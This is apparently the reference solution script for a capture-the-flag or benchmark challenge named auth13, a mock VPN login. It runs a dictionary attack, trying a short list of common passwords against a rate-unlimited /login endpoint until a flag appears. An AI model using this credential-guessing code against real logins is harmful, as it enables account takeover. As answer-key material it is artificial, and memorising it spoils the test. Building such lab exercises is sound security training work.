#!/usr/bin/env python3
"""Reference exploit for auth13 (RemoteLink VPN).

No rate limiting on /login, and the seeded account's password is drawn
from a short, common list -- dictionary attack finds it in a handful of
tries, with no delay or lockout to slow it down.
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8072")

CANDIDATES = [
    "qwerty", "Summer2024", "Winter2024", "Spring2024", "Password123",
    "Welcome123", "Qwerty123", "VpnAccess1",
]


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    # Pre-exploit: no session, and a wrong guess, must NOT return the flag.
    r = s.get(f"{BASE}/dashboard", timeout=5, allow_redirects=False)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: dashboard reachable with no session\n")
        return 1
    r = s.post(f"{BASE}/login", data={"username": "vpnuser", "password": "wrong-guess"},
               timeout=5)
    if "flag{" in r.text:
        sys.stderr.write("precondition failed: wrong password already returns the flag\n")
        return 1

    for pw in CANDIDATES:
        r = s.post(f"{BASE}/login", data={"username": "vpnuser", "password": pw}, timeout=5)
        r2 = s.get(f"{BASE}/dashboard", timeout=5)
        m = re.search(r"flag\{[^}]+\}", r2.text)
        if m:
            print(m.group(0))
            return 0

    sys.stderr.write("no flag found -- dictionary exhausted\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
